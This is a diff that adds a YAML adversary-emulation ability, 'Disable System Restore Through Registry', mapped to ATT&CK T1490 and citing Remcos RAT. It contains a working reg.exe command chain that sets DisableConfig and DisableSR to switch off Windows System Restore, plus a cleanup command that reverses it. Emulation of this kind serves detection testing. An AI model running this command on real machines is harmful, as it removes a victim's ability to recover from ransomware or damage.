@@ -1,0 +1,25 @@
+- description: "Modify the registry of the currently logged in user using reg.exe\
+    \ via cmd console to disable system restore on the computer. \nSee how remcos\
+    \ RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n"
+  id: c8f329d2-847e-de59-3b6c-b4a1ec6120fb
+  name: Disable System Restore Through Registry
+  platforms:
+    windows:
+      cmd:
+        cleanup: reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"
+          /v "DisableConfig" /f >nul 2>&1 && reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows
+          NT\SystemRestore" /v "DisableSR" /f >nul 2>&1 && reg delete "HKLM\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1 && reg
+          delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
+          /v "DisableSR" /f >nul 2>&1
+        command: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"
+          /v "DisableConfig" /t "REG_DWORD" /d "1" /f && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows
+          NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f && reg add "HKLM\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1"
+          /f && reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
+          /v "DisableSR" /t "REG_DWORD" /d "1" /f
+        payloads: []
+  tactic: impact
+  technique:
+    attack_id: T1490
+    name: Inhibit System Recovery
